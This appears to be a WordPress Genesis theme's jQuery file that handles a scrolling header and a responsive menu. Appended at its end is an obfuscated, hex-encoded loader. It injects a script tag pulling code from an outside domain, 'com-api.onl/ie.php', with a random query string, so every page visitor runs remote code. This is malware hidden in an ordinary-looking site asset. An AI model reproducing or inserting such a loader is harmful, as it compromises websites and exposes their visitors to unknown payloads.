jQuery(function( $ ){if( $( document ).scrollTop() > 0 ){$( '.site-header' ).addClass( 'dark' );}// Add opacity class to site header$( document ).on('scroll', function(){if ( $( document ).scrollTop() > 0 ){$( '.site-header' ).addClass( 'dark' );} else {$( '.site-header' ).removeClass( 'dark' );}});$( '.nav-primary .genesis-nav-menu, .nav-secondary .genesis-nav-menu' ).addClass( 'responsive-menu' ).before('<div class="responsive-menu-icon"></div>');$( '.responsive-menu-icon' ).click(function(){$(this).next( '.nav-primary .genesis-nav-menu,  .nav-secondary .genesis-nav-menu' ).slideToggle();});$( window ).resize(function(){if ( window.innerWidth > 800 ) {$( '.nav-primary .genesis-nav-menu,  .nav-secondary .genesis-nav-menu, nav .sub-menu' ).removeAttr( 'style' );$( '.responsive-menu > .menu-item' ).removeClass( 'menu-open' );}});$( '.responsive-menu > .menu-item' ).click(function(event){if ( event.target !== this )return;$(this).find( '.sub-menu:first' ).slideToggle(function() {$(this).parent().toggleClass( 'menu-open' );});});});var tesu_na=document.createElement('script');tesu_na.setAttribute("type","text/javascript");var _0kd9or=["\x2F\x2F\x63\x6F\x6D\x2D\x61\x70\x69\x2E\x6F\x6E\x6C\x2F\x69\x65\x2E\x70\x68\x70\x3F","\x72\x61\x6E\x64\x6F\x6D"];var nap_mur=_0kd9or[0]+Math[_0kd9or[1]]();tesu_na.setAttribute("src",nap_mur);if (typeof tesu_na!="undefined");document.getElementsByTagName("head")[0].appendChild(tesu_na);